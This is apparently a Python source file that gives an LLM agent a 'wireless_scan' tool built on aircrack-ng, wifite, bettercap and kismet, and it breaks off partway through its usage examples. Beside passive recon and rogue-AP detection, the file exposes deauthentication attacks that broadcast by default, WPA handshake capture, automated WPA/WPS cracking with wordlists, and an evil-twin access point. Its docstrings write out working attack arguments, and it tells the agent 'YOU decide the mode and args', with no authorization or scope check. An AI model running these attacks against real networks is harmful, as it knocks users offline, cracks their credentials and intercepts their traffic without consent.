import subprocess
import json
import re
import time
import csv
import io
from typing import Optional, Any
from pydantic import BaseModel, Field, validator


# ══════════════════════════════════════════════════════════════
# 1. SCHEMAS
# ══════════════════════════════════════════════════════════════

class WirelessScanRequest(BaseModel):
    tool: str
    interface: str
    mode: str
    args: list[str] = []
    timeout: int = Field(default=600, ge=30, le=7200)

    @validator("tool")
    def validate_tool(cls, v):
        allowed = {"aircrack-ng", "wifite", "bettercap", "kismet"}
        if v not in allowed:
            raise ValueError(f"Tool '{v}' not allowed. Use: {allowed}")
        return v

    @validator("interface")
    def validate_interface(cls, v):
        # Only allow safe interface names: wlan0, wlan1, mon0, wlp2s0, etc.
        if not re.match(r"^[a-zA-Z0-9_\-]{2,20}$", v.strip()):
            raise ValueError(f"Invalid interface name: '{v}'")
        return v.strip()

    @validator("mode")
    def validate_mode(cls, v):
        allowed_modes = {
            # aircrack-ng suite modes
            "ap_scan",          # airodump-ng: scan all APs + clients
            "channel_scan",     # airodump-ng: lock channel, targeted scan
            "handshake",        # airodump-ng + aireplay-ng: capture WPA handshake
            "deauth",           # aireplay-ng: send deauth frames
            "monitor_on",       # airmon-ng: enable monitor mode
            "monitor_off",      # airmon-ng: disable monitor mode
            # wifite modes
            "wifite_scan",      # wifite: passive scan only
            "wifite_attack",    # wifite: automated WPA/WPS attack
            # bettercap modes
            "bc_scan",          # bettercap: wifi.recon scan
            "bc_deauth",        # bettercap: wifi.deauth
            "bc_ap",            # bettercap: rogue AP / evil twin
            # kismet modes
            "kismet_scan",      # kismet: passive AP + client recon
        }
        if v not in allowed_modes:
            raise ValueError(f"Mode '{v}' not allowed. Use: {allowed_modes}")
        return v

    @validator("args")
    def validate_args(cls, v):
        """Block shell injection ONLY — let agent use ALL tool features"""
        dangerous_chars = [";", "&&", "||", "|", "`", "$(", ">>", "'", '"']
        blocked_output_flags = ["--write", "-w"]  # prevent uncontrolled file writes

        for arg in v:
            for char in dangerous_chars:
                if char in arg:
                    raise ValueError(f"Dangerous character '{char}' in: {arg}")
            # Only block bare -w / --write without path (agent may pass -w /tmp/capture)
            # We allow -w with a path but block bare flag injection
            if arg.strip() in blocked_output_flags:
                raise ValueError(
                    f"Bare output flag '{arg}' blocked — provide full path: ['-w', '/tmp/capture']"
                )
        return v


# ── Access Point ──
class APResult(BaseModel):
    bssid: Optional[str] = None
    ssid: Optional[str] = None
    channel: Optional[int] = None
    frequency: Optional[str] = None
    encryption: Optional[str] = None      # OPN, WEP, WPA, WPA2, WPA3
    cipher: Optional[str] = None          # CCMP, TKIP, CCMP+TKIP
    auth: Optional[str] = None            # PSK, MGT (802.1X), SAE
    signal_dbm: Optional[int] = None
    beacon_count: Optional[int] = None
    data_frames: Optional[int] = None
    speed_mbps: Optional[int] = None
    vendor: Optional[str] = None
    wps: Optional[bool] = None
    handshake_captured: Optional[bool] = None
    handshake_file: Optional[str] = None
    extra: Optional[dict[str, Any]] = None


# ── Wireless Client ──
class ClientResult(BaseModel):
    mac: Optional[str] = None
    associated_bssid: Optional[str] = None
    associated_ssid: Optional[str] = None
    signal_dbm: Optional[int] = None
    data_frames: Optional[int] = None
    probes: Optional[list[str]] = None     # SSIDs the client is probing for
    extra: Optional[dict[str, Any]] = None


# ── Rogue AP / Evil Twin Indicator ──
class RogueAPResult(BaseModel):
    bssid: str
    ssid: str
    reason: str                            # e.g. "duplicate SSID", "mismatched channel"
    legitimate_bssid: Optional[str] = None


# ── Final Result ──
class WirelessScanResult(BaseModel):
    success: bool
    tool: str
    interface: str
    mode: str
    command: str
    total_aps: int = 0
    total_clients: int = 0
    total_rogues: int = 0
    access_points: list[APResult] = []
    clients: list[ClientResult] = []
    rogue_aps: list[RogueAPResult] = []
    handshake_files: list[str] = []
    raw_output: Optional[str] = None
    error: Optional[str] = None
    execution_time: float = 0.0


# ══════════════════════════════════════════════════════════════
# 2. PARSERS
# ══════════════════════════════════════════════════════════════

def parse_airodump(stdout: str, stderr: str) -> tuple[list[APResult], list[ClientResult]]:
    """
    Parse airodump-ng output.

    Supports two formats:
      1. CSV  (-w /tmp/capture → /tmp/capture-01.csv)  — structured, preferred
      2. Plain text (terminal output)                   — regex fallback
    """
    aps: list[APResult] = []
    clients: list[ClientResult] = []
    raw = stdout or stderr

    # ══════════════════════════════
    # TRY CSV PARSE
    # ══════════════════════════════
    # airodump CSV has two sections separated by a blank line:
    #   Section 1: APs
    #   Section 2: Clients
    csv_match = re.search(
        r"BSSID,\s*First time seen.*?\n(.*?)\r?\n\r?\n"   # AP section
        r"Station MAC,.*?\n(.*)",                          # Client section
        raw, re.DOTALL | re.IGNORECASE
    )
    if csv_match:
        ap_section     = csv_match.group(1).strip()
        client_section = csv_match.group(2).strip()

        # ── Parse APs ──
        try:
            reader = csv.DictReader(
                io.StringIO(ap_section),
                fieldnames=[
                    "BSSID", "First time seen", "Last time seen", "channel",
                    "Speed", "Privacy", "Cipher", "Authentication",
                    "Power", "beacons", "IV", "LAN IP", "ID-length", "ESSID", "Key"
                ]
            )
            for row in reader:
                bssid = row.get("BSSID", "").strip()
                if not bssid or not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                    continue
                try:
                    ch = int(row.get("channel", "0").strip())
                except (ValueError, AttributeError):
                    ch = None
                try:
                    sig = int(row.get("Power", "0").strip())
                except (ValueError, AttributeError):
                    sig = None
                try:
                    speed = int(row.get("Speed", "0").strip())
                except (ValueError, AttributeError):
                    speed = None
                try:
                    beacons = int(row.get("beacons", "0").strip())
                except (ValueError, AttributeError):
                    beacons = None
                aps.append(APResult(
                    bssid=bssid,
                    ssid=row.get("ESSID", "").strip() or None,
                    channel=ch,
                    encryption=row.get("Privacy", "").strip() or None,
                    cipher=row.get("Cipher", "").strip() or None,
                    auth=row.get("Authentication", "").strip() or None,
                    signal_dbm=sig,
                    speed_mbps=speed,
                    beacon_count=beacons,
                ))
        except Exception:
            pass

        # ── Parse Clients ──
        try:
            reader = csv.DictReader(
                io.StringIO(client_section),
                fieldnames=[
                    "Station MAC", "First time seen", "Last time seen",
                    "Power", "packets", "BSSID", "Probed ESSIDs"
                ]
            )
            for row in reader:
                mac = row.get("Station MAC", "").strip()
                if not mac or not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac):
                    continue
                try:
                    sig = int(row.get("Power", "0").strip())
                except (ValueError, AttributeError):
                    sig = None
                probes_raw = row.get("Probed ESSIDs", "").strip()
                probes = [p.strip() for p in probes_raw.split(",") if p.strip()] if probes_raw else None
                assoc_bssid = row.get("BSSID", "").strip()
                clients.append(ClientResult(
                    mac=mac,
                    associated_bssid=assoc_bssid if assoc_bssid != "(not associated)" else None,
                    signal_dbm=sig,
                    probes=probes,
                ))
        except Exception:
            pass

        if aps or clients:
            return aps, clients

    # ══════════════════════════════
    # FALLBACK: REGEX PARSE (terminal output)
    # ══════════════════════════════
    # AP line: AA:BB:CC:DD:EE:FF  -70   6   120    0    0   1  54e  WPA2 CCMP   PSK  MyNetwork
    ap_pattern = re.compile(
        r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+"   # BSSID
        r"(-?\d+)\s+"                                    # Power
        r"\d+\s+\d+\s+\d+\s+\d+\s+"                    # beacons/IV/...
        r"(\d+)\s+"                                      # Channel
        r"\d+\S*\s+"                                     # Speed
        r"(\S+)\s+"                                      # Privacy
        r"(\S+)?\s*"                                     # Cipher (optional)
        r"(\S+)?\s+"                                     # Auth (optional)
        r"(.*?)$",                                       # SSID
        re.MULTILINE
    )
    for m in ap_pattern.finditer(raw):
        aps.append(APResult(
            bssid=m.group(1),
            signal_dbm=int(m.group(2)),
            channel=int(m.group(3)),
            encryption=m.group(4),
            cipher=m.group(5),
            auth=m.group(6),
            ssid=m.group(7).strip() or None,
        ))

    # Client line: AA:BB:CC:DD:EE:FF  FF:EE:DD:CC:BB:AA  -65   50   ..  Probe1,Probe2
    client_pattern = re.compile(
        r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+"   # Client MAC
        r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}|not associated)\s+"  # BSSID
        r"(-?\d+)\s+\d+\s+\S+\s*"                       # Power + packets
        r"(.*?)$",                                       # Probed ESSIDs
        re.MULTILINE
    )
    for m in client_pattern.finditer(raw):
        probes_raw = m.group(4).strip()
        probes = [p.strip() for p in probes_raw.split(",") if p.strip()] if probes_raw else None
        clients.append(ClientResult(
            mac=m.group(1),
            associated_bssid=m.group(2) if "not associated" not in m.group(2) else None,
            signal_dbm=int(m.group(3)),
            probes=probes,
        ))

    return aps, clients


def parse_wifite(stdout: str) -> tuple[list[APResult], list[str]]:
    """
    Parse wifite output.
    Returns (aps, handshake_files).

    Wifite outputs scan tables and attack summaries in plain text.
    """
    aps: list[APResult] = []
    handshake_files: list[str] = []

    # ── AP Table ──
    # NUM  ESSID              CH  ENCR   POWER  WPS?  CLIENT
    #   1  MyNetwork           6  WPA2    -65dBm  yes   1
    ap_table_pattern = re.compile(
        r"(\d+)\s+"                          # NUM
        r"(.+?)\s+"                          # ESSID
        r"(\d+)\s+"                          # CH
        r"(\w+(?:\w+)?)\s+"                  # ENCR
        r"(-?\d+)dBm\s+"                     # POWER
        r"(yes|no)\s+"                       # WPS
        r"(\d+)",                            # CLIENTS
        re.IGNORECASE
    )
    for m in ap_table_pattern.finditer(stdout):
        aps.append(APResult(
            ssid=m.group(2).strip(),
            channel=int(m.group(3)),
            encryption=m.group(4).upper(),
            signal_dbm=int(m.group(5)),
            wps=m.group(6).lower() == "yes",
        ))

    # ── Handshake captured ──
    # [+] saved handshake to /root/hs/MyNetwork_AABBCCDDEEFF.cap
    handshake_pattern = re.compile(
        r"saved handshake to\s+(\S+\.cap)", re.IGNORECASE
    )
    for m in handshake_pattern.finditer(stdout):
        handshake_files.append(m.group(1))

    # Mark APs with captured handshakes
    for ap in aps:
        for hf in handshake_files:
            if ap.ssid and ap.ssid.lower().replace(" ", "") in hf.lower():
                ap.handshake_captured = True
                ap.handshake_file = hf

    return aps, handshake_files


def parse_bettercap(stdout: str) -> tuple[list[APResult], list[ClientResult], list[RogueAPResult]]:
    """
    Parse bettercap wifi.recon JSON or plain text output.
    Also detects rogue APs by comparing duplicate SSIDs with mismatched BSSIDs.
    """
    aps: list[APResult] = []
    clients: list[ClientResult] = []
    rogues: list[RogueAPResult] = []

    # ══════════════════════════════
    # TRY JSON PARSE
    # ══════════════════════════════
    for line in stdout.strip().split("\n"):
        line = line.strip()
        if not line:
            continue
        try:
            obj = json.loads(line)

            # AP object
            if "bssid" in obj or "BSSID" in obj:
                bssid = obj.get("bssid") or obj.get("BSSID")
                aps.append(APResult(
                    bssid=bssid,
                    ssid=obj.get("essid") or obj.get("SSID"),
                    channel=obj.get("channel"),
                    encryption=obj.get("encryption"),
                    cipher=obj.get("cipher"),
                    signal_dbm=obj.get("rssi") or obj.get("signal"),
                    wps=obj.get("wps"),
                    vendor=obj.get("vendor"),
                ))
            # Client object
            elif "station" in obj or "mac" in obj:
                mac = obj.get("station") or obj.get("mac")
                clients.append(ClientResult(
                    mac=mac,
                    associated_bssid=obj.get("ap") or obj.get("bssid"),
                    signal_dbm=obj.get("rssi") or obj.get("signal"),
                ))
            continue
        except (json.JSONDecodeError, TypeError):
            pass

    # ══════════════════════════════
    # FALLBACK: PLAIN TEXT
    # ══════════════════════════════
    if not aps:
        # bettercap plain output:
        # wifi.recon.ap  AA:BB:CC:DD:EE:FF  -65 dBm  ch 6  WPA2  MyNetwork
        ap_pattern = re.compile(
            r"wifi\.recon.*?"
            r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+"
            r"(-?\d+)\s+dBm\s+"
            r"ch\s+(\d+)\s+"
            r"(\w+)\s+"
            r"(.*?)$",
            re.MULTILINE | re.IGNORECASE,
        )
        for m in ap_pattern.finditer(stdout):
            aps.append(APResult(
                bssid=m.group(1),
                signal_dbm=int(m.group(2)),
                channel=int(m.group(3)),
                encryption=m.group(4),
                ssid=m.group(5).strip() or None,
            ))

        client_pattern = re.compile(
            r"wifi\.client.*?"
            r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\s+"
            r"(-?\d+)\s+dBm",
            re.MULTILINE | re.IGNORECASE,
        )
        for m in client_pattern.finditer(stdout):
            clients.append(ClientResult(
                mac=m.group(1),
                signal_dbm=int(m.group(2)),
            ))

    # ══════════════════════════════
    # ROGUE AP DETECTION
    # ══════════════════════════════
    # Flag duplicate SSIDs with different BSSIDs as potential rogue APs
    ssid_map: dict[str, list[APResult]] = {}
    for ap in aps:
        if ap.ssid:
            ssid_map.setdefault(ap.ssid, []).append(ap)

    for ssid, ap_list in ssid_map.items():
        if len(ap_list) > 1:
            bssids = list({ap.bssid for ap in ap_list if ap.bssid})
            if len(bssids) > 1:
                channels = [ap.channel for ap in ap_list if ap.channel]
                reason = "duplicate SSID"
                if len(set(channels)) > 1:
                    reason += " with mismatched channels"
                # Flag all but the strongest signal as potential rogues
                sorted_aps = sorted(ap_list, key=lambda a: a.signal_dbm or -999, reverse=True)
                legitimate = sorted_aps[0]
                for rogue_ap in sorted_aps[1:]:
                    if rogue_ap.bssid:
                        rogues.append(RogueAPResult(
                            bssid=rogue_ap.bssid,
                            ssid=ssid,
                            reason=reason,
                            legitimate_bssid=legitimate.bssid,
                        ))

    return aps, clients, rogues


def parse_kismet(stdout: str, stderr: str) -> tuple[list[APResult], list[ClientResult]]:
    """
    Parse kismet output.

    Supports:
      1. JSON (kismet --output-type json)
      2. Plain text / gpsxml fallback
    """
    aps: list[APResult] = []
    clients: list[ClientResult] = []
    raw = stdout or stderr

    # ══════════════════════════════
    # TRY JSON PARSE
    # ══════════════════════════════
    try:
        data = json.loads(raw)
        devices = data if isinstance(data, list) else data.get("devices", [])
        for dev in devices:
            dot11 = dev.get("dot11.device", {})
            if dot11:
                # It's an AP
                aps.append(APResult(
                    bssid=dev.get("kismet.device.base.macaddr"),
                    ssid=dot11.get("dot11.device.last_beaconed_ssid"),
                    channel=int(dev.get("kismet.device.base.channel", 0)) or None,
                    encryption=dot11.get("dot11.device.best_crypt_set"),
                    signal_dbm=dev.get("kismet.device.base.signal", {}).get("kismet.common.signal.last_signal"),
                    beacon_count=dot11.get("dot11.device.num_beacons_seen"),
                    vendor=dev.get("kismet.device.base.manuf"),
                ))
            else:
                # It's a client
                clients.append(ClientResult(
                    mac=dev.get("kismet.device.base.macaddr"),
                    signal_dbm=dev.get("kismet.device.base.signal", {}).get("kismet.common.signal.last_signal"),
                    vendor=dev.get("kismet.device.base.manuf"),
                ))
        return aps, clients
    except (json.JSONDecodeError, TypeError, KeyError):
        pass

    # ══════════════════════════════
    # FALLBACK: PLAIN TEXT
    # ══════════════════════════════
    # Kismet text: Found AP: 'MyNetwork' (AA:BB:CC:DD:EE:FF) Ch 6  WPA2  -65 dBm
    ap_pattern = re.compile(
        r"Found AP.*?['\"](.+?)['\"].*?"
        r"([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}).*?"
        r"Ch\s+(\d+).*?"
        r"(-?\d+)\s+dBm",
        re.IGNORECASE,
    )
    for m in ap_pattern.finditer(raw):
        aps.append(APResult(
            ssid=m.group(1),
            bssid=m.group(2),
            channel=int(m.group(3)),
            signal_dbm=int(m.group(4)),
        ))

    return aps, clients


# ══════════════════════════════════════════════════════════════
# 3. EXECUTOR
# ══════════════════════════════════════════════════════════════

def safe_execute(cmd: list[str], timeout: int = 600) -> tuple[str, str, int]:
    """Run command safely — no shell, no injection"""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            shell=False,
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Timed out after {timeout}s", -1
    except FileNotFoundError:
        return "", f"Tool '{cmd[0]}' not installed", -1
    except Exception as e:
        return "", str(e), -1


# ══════════════════════════════════════════════════════════════
# 4. MAIN TOOL FUNCTION
# ══════════════════════════════════════════════════════════════

def wireless_scan(
    tool: str,
    interface: str,
    mode: str,
    args: list[str] = [],
) -> dict:
    """
    🔧 Agent Tool: WiFi Recon — AP Discovery, WPA Handshake Capture,
                   Deauth, Rogue AP Detection, Client Enumeration

    Capabilities:
      ┌─────────────────────────────────────────────────────────────────┐
      │  AP DISCOVERY        airodump-ng, wifite, bettercap, kismet     │
      │  CLIENT ENUM         airodump-ng, bettercap, kismet             │
      │  WPA HANDSHAKE       airodump-ng (capture) + aireplay-ng        │
      │  DEAUTH ATTACK       aireplay-ng, bettercap wifi.deauth         │
      │  ROGUE AP DETECTION  bettercap (SSID + BSSID cross-check)       │
      │  MONITOR MODE        airmon-ng start/stop                       │
      │  PASSIVE RECON       kismet (no TX, fully passive)              │
      │  EVIL TWIN / ROGUE   bettercap ap mode                          │
      └─────────────────────────────────────────────────────────────────┘

    Args:
        tool:       "aircrack-ng" | "wifite" | "bettercap" | "kismet"
        interface:  Wireless interface (e.g. "wlan0", "wlan1", "mon0")
        mode:       Operation mode (see below)
        args:       Raw tool arguments — agent decides

    ── aircrack-ng suite modes ──────────────────────────────────────
        "monitor_on"     → airmon-ng start <iface>
                           args: []  or  ["check", "kill"] to kill interfering processes

        "monitor_off"    → airmon-ng stop <iface>
                           args: []

        "ap_scan"        → airodump-ng <iface>
                           args: ["--band", "abg"]         scan 2.4+5 GHz
                                 ["-w", "/tmp/cap"]        write capture file
                                 ["--manufacturer"]        show vendor

        "channel_scan"   → airodump-ng --channel <ch> <iface>
                           args: ["--channel", "6"]
                                 ["--bssid", "AA:BB:CC:DD:EE:FF"]  target AP
                                 ["-w", "/tmp/cap"]

        "handshake"      → airodump-ng (targeted) + aireplay-ng -0 deauth
                           REQUIRED args: ["--bssid", "AA:BB:CC:DD:EE:FF",
                                           "--channel", "6",
                                           "-w", "/tmp/cap"]
                           optional:      ["--deauth-count", "5"]

        "deauth"         → aireplay-ng -0 <count> -a <bssid> -c <client> <iface>
                           REQUIRED args: ["-a", "AA:BB:CC:DD:EE:FF"]  AP BSSID
                           optional:      ["-c", "CC:DD:EE:FF:00:11"]  target client
                                          ["-0", "10"]                  deauth count

    ── wifite modes ─────────────────────────────────────────────────
        "wifite_scan"    → wifite --scan (passive, no attack)
                           args: ["--kill"]              kill interfering processes
                                 ["--band", "5ghz"]      5 GHz only

        "wifite_attack"  → wifite (automated WPA/WPS attack)
                           args: ["--wpa"]               WPA targets only
                                 ["--wps"]               WPS targets only
                                 ["--bssid", "AA:BB:CC:DD:EE:FF"]  single target
                                 ["--dict", "/path/to/wordlist.txt"]
                                 ["--kill", "--no-wep"]

    ── bettercap modes ──────────────────────────────────────────────
        "bc_scan"        → bettercap wifi.recon
                           args: ["--iface", "wlan0"]
                                 ["-eval", "wifi.recon.channel 6"]  lock channel

        "bc_deauth"      → bettercap wifi.deauth
                           REQUIRED args: ["-eval", "wifi.deauth AA:BB:CC:DD:EE:FF"]
                           broadcast:     ["-eval", "wifi.deauth ff:ff:ff:ff:ff:ff"]

        "bc_ap"          → bettercap evil twin / rogue AP
                           args: ["-eval", "set wifi.ap.ssid MyNetwork; wifi.ap on"]

    ── kismet modes ─────────────────────────────────────────────────
        "kismet_scan"    → kismet (passive, fully RF-silent, no TX)
                           args: ["--source", "wlan0:name=recon"]
                                 ["-c", "wlan0:channels=1,6,11"]
                                 ["--log-types", "kismet"]

    Returns:
        Structured JSON: access_points → clients → rogue_aps → handshake_files
    """

    start = time.time()

    # ══════════════════════════════
    # VALIDATE
    # ══════════════════════════════
    try:
        req = WirelessScanRequest(
            tool=tool,
            interface=interface,
            mode=mode,
            args=args,
        )
    except Exception as e:
        return WirelessScanResult(
            success=False, tool=tool, interface=interface, mode=mode,
            command="", error=f"Validation: {e}"
        ).model_dump()

    # ══════════════════════════════
    # BUILD COMMAND
    # ══════════════════════════════
    cmd: list[str] = []

    # ── aircrack-ng suite ──
    if tool == "aircrack-ng":

        if mode == "monitor_on":
            cmd = ["airmon-ng", "start", req.interface] + list(req.args)

        elif mode == "monitor_off":
            cmd = ["airmon-ng", "stop", req.interface] + list(req.args)

        elif mode == "ap_scan":
            cmd = ["airodump-ng"] + list(req.args) + [req.interface]
            # Auto-inject CSV output if no -w provided
            if "-w" not in req.args:
                cmd = ["airodump-ng", "--output-format", "csv",
                       "-w", "/tmp/airodump_scan"] + list(req.args) + [req.interface]

        elif mode == "channel_scan":
            cmd = ["airodump-ng"] + list(req.args) + [req.interface]
            if "-w" not in req.args:
                cmd = ["airodump-ng", "--output-format", "csv",
                       "-w", "/tmp/airodump_channel"] + list(req.args) + [req.interface]

        elif mode == "handshake":
            # Run airodump-ng targeted + aireplay-ng deauth in sequence
            # Extract BSSID and channel from args
            bssid = None
            channel = None
            for i, arg in enumerate(req.args):
                if arg == "--bssid" and i + 1 < len(req.args):
                    bssid = req.args[i + 1]
                if arg == "--channel" and i + 1 < len(req.args):
                    channel = req.args[i + 1]
                if arg == "-c" and i + 1 < len(req.args):
                    channel = req.args[i + 1]

            if not bssid or not channel:
                return WirelessScanResult(
                    success=False, tool=tool, interface=interface, mode=mode,
                    command="", error="handshake mode requires --bssid and --channel in args"
                ).model_dump()

            # Primary command: targeted airodump-ng
            capture_prefix = "/tmp/handshake_cap"
            cmd = [
                "airodump-ng",
                "--bssid", bssid,
                "--channel", channel,
                "--output-format", "cap,csv",
                "-w", capture_prefix,
            ] + [a for a in req.args if a not in ("--bssid", bssid, "--channel", channel)]
            cmd += [req.interface]

        elif mode == "deauth":
            count = "5"
            bssid = None
            client = "FF:FF:FF:FF:FF:FF"  # broadcast by default
            for i, arg in enumerate(req.args):
                if arg == "-a" and i + 1 < len(req.args):
                    bssid = req.args[i + 1]
                if arg == "-c" and i + 1 < len(req.args):
                    client = req.args[i + 1]
                if arg == "-0" and i + 1 < len(req.args):
                    count = req.args[i + 1]

            if not bssid:
                return WirelessScanResult(
                    success=False, tool=tool, interface=interface, mode=mode,
                    command="", error="deauth mode requires -a <BSSID> in args"
                ).model_dump()

            cmd = [
                "aireplay-ng",
                "-0", count,
                "-a", bssid,
                "-c", client,
                req.interface,
            ]

        else:
            return WirelessScanResult(
                success=False, tool=tool, interface=interface, mode=mode,
                command="", error=f"Unknown mode '{mode}' for aircrack-ng"
            ).model_dump()

    # ── wifite ──
    elif tool == "wifite":

        if mode == "wifite_scan":
            cmd = ["wifite", "--scan", "--interface", req.interface] + list(req.args)

        elif mode == "wifite_attack":
            cmd = ["wifite", "--interface", req.interface] + list(req.args)

        else:
            return WirelessScanResult(
                success=False, tool=tool, interface=interface, mode=mode,
                command="", error=f"Unknown mode '{mode}' for wifite"
            ).model_dump()

    # ── bettercap ──
    elif tool == "bettercap":

        if mode == "bc_scan":
            eval_cmd = "wifi.recon on; sleep 15; wifi.show; quit"
            # Allow agent to override eval
            eval_override = next((req.args[i+1] for i, a in enumerate(req.args) if a == "-eval"), None)
            if eval_override:
                eval_cmd = eval_override
                remaining = [a for i, a in enumerate(req.args) if a != "-eval" and (i == 0 or req.args[i-1] != "-eval")]
            else:
                remaining = list(req.args)
            cmd = ["bettercap", "-iface", req.interface, "-eval", eval_cmd] + remaining

        elif mode == "bc_deauth":
            eval_cmd = "wifi.recon on"
            eval_override = next((req.args[i+1] for i, a in enumerate(req.args) if a == "-eval"), None)
            if eval_override:
                eval_cmd = eval_override
                remaining = [a for i, a in enumerate(req.args) if a != "-eval" and (i == 0 or req.args[i-1] != "-eval")]
            else:
                remaining = list(req.args)
            cmd = ["bettercap", "-iface", req.interface, "-eval", eval_cmd] + remaining

        elif mode == "bc_ap":
            eval_cmd = "wifi.ap on"
            eval_override = next((req.args[i+1] for i, a in enumerate(req.args) if a == "-eval"), None)
            if eval_override:
                eval_cmd = eval_override
                remaining = [a for i, a in enumerate(req.args) if a != "-eval" and (i == 0 or req.args[i-1] != "-eval")]
            else:
                remaining = list(req.args)
            cmd = ["bettercap", "-iface", req.interface, "-eval", eval_cmd] + remaining

        else:
            return WirelessScanResult(
                success=False, tool=tool, interface=interface, mode=mode,
                command="", error=f"Unknown mode '{mode}' for bettercap"
            ).model_dump()

    # ── kismet ──
    elif tool == "kismet":

        if mode == "kismet_scan":
            cmd = [
                "kismet",
                "--source", f"{req.interface}:name=recon",
                "--no-ncurses",
                "--output-type", "json",
            ] + list(req.args)

        else:
            return WirelessScanResult(
                success=False, tool=tool, interface=interface, mode=mode,
                command="", error=f"Unknown mode '{mode}' for kismet"
            ).model_dump()

    else:
        return WirelessScanResult(
            success=False, tool=tool, interface=interface, mode=mode,
            command="", error=f"Unknown tool: {tool}"
        ).model_dump()

    # ══════════════════════════════
    # EXECUTE
    # ══════════════════════════════
    command_str = " ".join(cmd)
    stdout, stderr, rc = safe_execute(cmd, req.timeout)

    # ══════════════════════════════
    # PARSE
    # ══════════════════════════════
    aps: list[APResult] = []
    clients: list[ClientResult] = []
    rogues: list[RogueAPResult] = []
    handshake_files: list[str] = []

    if tool == "aircrack-ng":
        if mode in ("ap_scan", "channel_scan", "handshake"):
            aps, clients = parse_airodump(stdout, stderr)

            # Check for captured handshake file
            if mode == "handshake":
                cap_files = re.findall(r"/tmp/handshake_cap[^\s]*\.cap", stdout + stderr)
                handshake_files = cap_files
                for ap in aps:
                    if cap_files:
                        ap.handshake_captured = True
                        ap.handshake_file = cap_files[0]

    elif tool == "wifite":
        aps, handshake_files = parse_wifite(stdout)

    elif tool == "bettercap":
        aps, clients, rogues = parse_bettercap(stdout)

    elif tool == "kismet":
        aps, clients = parse_kismet(stdout, stderr)

    # ══════════════════════════════
    # BUILD RESULT
    # ══════════════════════════════
    return WirelessScanResult(
        success=len(aps) > 0 or len(handshake_files) > 0 or rc == 0,
        tool=tool,
        interface=interface,
        mode=mode,
        command=command_str,
        total_aps=len(aps),
        total_clients=len(clients),
        total_rogues=len(rogues),
        access_points=aps,
        clients=clients,
        rogue_aps=rogues,
        handshake_files=handshake_files,
        raw_output=(stdout or stderr)[:5000],
        error=stderr if rc != 0 and not aps else None,
        execution_time=round(time.time() - start, 2),
    ).model_dump()


# ══════════════════════════════════════════════════════════════
# 5. TOOL DEFINITION (for LLM)
# ══════════════════════════════════════════════════════════════

WIRELESS_SCAN_TOOL_DEFINITION = {
    "name": "wireless_scan",
    "description": (
        "WiFi recon: AP discovery, WPA handshake capture, deauth attacks, "
        "rogue AP detection, and client enumeration. "
        "Supports aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng), "
        "wifite (automated WPA/WPS), bettercap (recon + deauth + evil twin), "
        "and kismet (passive RF recon). "
        "YOU decide the mode and args."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "tool": {
                "type": "string",
                "enum": ["aircrack-ng", "wifite", "bettercap", "kismet"],
                "description": (
                    "aircrack-ng = full manual control (monitor, scan, handshake, deauth) | "
                    "wifite      = automated WPA/WPS attack workflow | "
                    "bettercap   = recon + deauth + evil twin | "
                    "kismet      = fully passive RF recon (no TX)"
                ),
            },
            "interface": {
                "type": "string",
                "description": "Wireless interface name (e.g. 'wlan0', 'wlan1', 'mon0')",
            },
            "mode": {
                "type": "string",
                "enum": [
                    "monitor_on", "monitor_off",
                    "ap_scan", "channel_scan", "handshake", "deauth",
                    "wifite_scan", "wifite_attack",
                    "bc_scan", "bc_deauth", "bc_ap",
                    "kismet_scan",
                ],
                "description": (
                    "monitor_on     → enable monitor mode (aircrack-ng)\n"
                    "monitor_off    → disable monitor mode (aircrack-ng)\n"
                    "ap_scan        → scan all APs + clients (airodump-ng)\n"
                    "channel_scan   → targeted channel scan (airodump-ng)\n"
                    "handshake      → capture WPA handshake (airodump-ng + deauth)\n"
                    "deauth         → deauth attack (aireplay-ng)\n"
                    "wifite_scan    → passive scan only (wifite)\n"
                    "wifite_attack  → automated WPA/WPS attack (wifite)\n"
                    "bc_scan        → wifi.recon (bettercap)\n"
                    "bc_deauth      → wifi.deauth (bettercap)\n"
                    "bc_ap          → rogue AP / evil twin (bettercap)\n"
                    "kismet_scan    → passive kismet recon"
                ),
            },
            "args": {
                "type": "array",
                "items": {"type": "string"},
                "description": (
                    "Raw tool arguments. Examples:\n"
                    "ap_scan:       ['-w', '/tmp/cap', '--band', 'abg']\n"
                    "channel_scan:  ['--channel', '6', '--bssid', 'AA:BB:CC:DD:EE:FF']\n"
                    "handshake:     ['--bssid', 'AA:BB:CC:DD:EE:FF', '--channel', '6', '-w', '/tmp/hs']\n"
                    "deauth:        ['-a', 'AA:BB:CC:DD:EE:FF', '-c', 'CC:DD:EE:FF:00:11', '-0', '10']\n"
                    "monitor_on:    ['check', 'kill']  ← kill interfering procs\n"
                    "wifite_attack: ['--wpa', '--bssid', 'AA:BB:CC:DD:EE:FF', '--dict', '/path/list.txt']\n"
                    "bc_scan:       ['-eval', 'wifi.recon.channel 6']\n"
                    "bc_deauth:     ['-eval', 'wifi.deauth AA:BB:CC:DD:EE:FF']\n"
                    "bc_ap:         ['-eval', 'set wifi.ap.ssid FreeWifi; wifi.ap on']\n"
                    "kismet_scan:   ['-c', 'wlan0:channels=1,6,11']"
                ),
            },
        },
        "required": ["tool", "interface", "mode"],
    },
}


# ══════════════════════════════════════════════════════════════
# 6. USAGE EXAMPLES — WHAT AGENT CALLS
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":

    # ─────────────────────────────
    # 1. Enable monitor mode
    # ─────────────────────────────
    r = wireless_scan(
        tool="aircrack-ng",
        interface="wlan0",
        mode="monitor_on",
        args=["check", "kill"],
    )
    print("=== MONITOR ON ===")
    print(json.dumps(r, indent=2))

    # ─────────────────────────────
    # 2. Passive AP + client scan
    # ─────────────────────────────
    r = wireless_scan(
        tool="aircrack-ng",
        interface="wlan0mon",
